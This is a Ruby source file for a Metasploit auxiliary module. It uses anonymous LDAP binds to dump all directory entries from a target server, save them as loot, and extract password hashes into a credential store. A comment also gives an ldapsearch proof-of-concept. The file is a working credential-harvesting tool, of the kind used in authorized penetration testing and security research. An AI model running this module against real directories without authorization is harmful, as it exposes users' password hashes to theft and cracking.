##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/hashes/identify'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::LDAP
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'LDAP Information Disclosure',
        'Description' => %q{
          This module uses an anonymous-bind LDAP connection to dump data from
          an LDAP server. Searching for attributes with user credentials
          (e.g. userPassword).
        },
        'Author' => [
          'Hynek Petrak', # Discovery, hash dumping
          'wvu' # Module
        ],
        'References' => [
        ],
        'DisclosureDate' => '2020-07-23',
        'License' => MSF_LICENSE,
        'Actions' => [
          ['Dump', 'Description' => 'Dump all LDAP data']
        ],
        'DefaultAction' => 'Dump',
        'DefaultOptions' => {
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(636), # SSL/TLS
      OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),
      OptString.new('USER_ATTR', [false, 'LDAP attribute(s), that contains username', 'dn']),
      OptString.new('PASS_ATTR', [
        true, 'LDAP attribute, that contains password hashes',
        'userPassword, sambantpassword, sambalmpassword, unixUserPassword, password'
      ])
    ])
  end

  def pass_attr
    @pass_attr ||= 'userPassword, sambantpassword, sambalmpassword, unixUserPassword, password'
  end

  def user_attr
    @user_attr ||= 'dn'
  end

  # PoC using ldapsearch(1):
  #
  # Retrieve root DSE with base DN:
  #   ldapsearch -xb "" -s base -H ldap://[redacted]
  #
  # Dump data using discovered base DN:
  #   ldapsearch -xb bind_dn -H ldap://[redacted] \* + -
  def run
    entries = nil
    base_dn_vuln = nil

    ldap_connect do |ldap|
      if ldap.get_operation_result.code == 0
        print_status("#{peer} LDAP connection established")
      else
        # Even if we get "Invalid credentials" error, we may proceed with anonymous bind
        print_error("#{peer} LDAP error #{ldap.get_operation_result.code}: #{ldap.get_operation_result.message}")
      end

      if (base_dn = datastore['BASE_DN'])
        print_status("User-specified base DN: #{base_dn}")
        naming_contexts = [base_dn]
      else
        print_status('Discovering base DN(s) automatically')

        naming_contexts = get_naming_contexts(ldap)
        if naming_contexts.nil? || naming_contexts.empty?
          print_warning('Falling back to an empty base DN')
          naming_contexts = ['']
        end
      end

      naming_contexts.each do |item|
        print_status("#{peer} Dumping data for base DN='#{item}'")
        entries = ldap.search(base: item, attributes: %w[* + -])
        # We are ok with any entry returned
        if entries && entries.any?
          base_dn_vuln = item
          pillage(entries, item)
        else
          print_error("#{peer} did not return any entries for base DN='#{item}'")
        end
      end
    end

    # We are ok with any entry returned
    unless base_dn_vuln
      print_error("#{peer} seems to be safe")
      return Exploit::CheckCode::Safe
    end

    # HACK: Stash discovered base DN in CheckCode reason
    Exploit::CheckCode::Vulnerable(base_dn_vuln)
  rescue Net::LDAP::Error => e
    print_error("#{e.class}: #{e.message}")
    Exploit::CheckCode::Unknown
  end

  def pillage(entries, base_dn)
    # TODO: Make this more efficient?
    ldif = entries.map(&:to_ldif).map { |s| s.force_encoding('utf-8') }.join("\n")

    print_status("Storing LDAP data for base DN='#{base_dn}' in loot")

    ldif_filename = store_loot(
      name, # ltype
      'text/plain', # ctype
      rhost, # host
      ldif, # data
      nil, # filename
      "Base DN: #{base_dn}" # info
    )

    unless ldif_filename
      print_error('Could not store LDAP data in loot')
      return
    end

    print_good("Saved LDAP data to #{ldif_filename}")

    @pass_attr ||= datastore['PASS_ATTR']

    print_status("Searching for attribute(s): #{@pass_attr}")
    # Process entries with a non-empty hash/password attribute
    @pass_attr.split(/[,\s]+/).compact.reject(&:empty?).each do |item|
      process_hashes(entries.select { |entry| entry[item.strip].any? }, item.strip)
    end
  end

  def process_hashes(entries, pass_attr_name)
    if entries.empty?
      print_status("No enties found for the '#{pass_attr_name}' attribute")
      return
    end

    service_details = {
      workspace_id: myworkspace_id,
      module_fullname: fullname,
      origin_type: :service,
      address: rhost,
      port: rport,
      protocol: 'tcp',
      service_name: 'ldap'
    }

    @user_attr ||= datastore['USER_ATTR']

    @user_attr ||= 'dn'

    print_status("Taking '#{@user_attr}' attribute as username, '#{pass_attr_name}' as password")

    entries.each do |entry|
      # This is the "username"
      dn = entry[@user_attr].first # .dn

      hash = entry[pass_attr_name].first

      # Skip empty hashes '{CRYPT}x'
      if hash.nil? || hash.empty? ||
         (hash.downcase.start_with?('{crypt}') && hash.length < 10)
        next
      end

      hash.gsub!('{crypt}$1$', '$1$')

      print_good("Credentials found: #{dn}:#{hash}")

      case @pass_attr.downcase
      when 'sambalmpassword'
        hash_format = 'lm'
      when 'sambantpassword'
        hash_format = 'nt'
      else
        hash_format = identify_hash(hash)
      end

      create_credential(service_details.merge(
        username: dn,
        private_data: hash,
        private_type: :nonreplayable_hash,
        jtr_format: hash_format
      ))
    end
  end

end
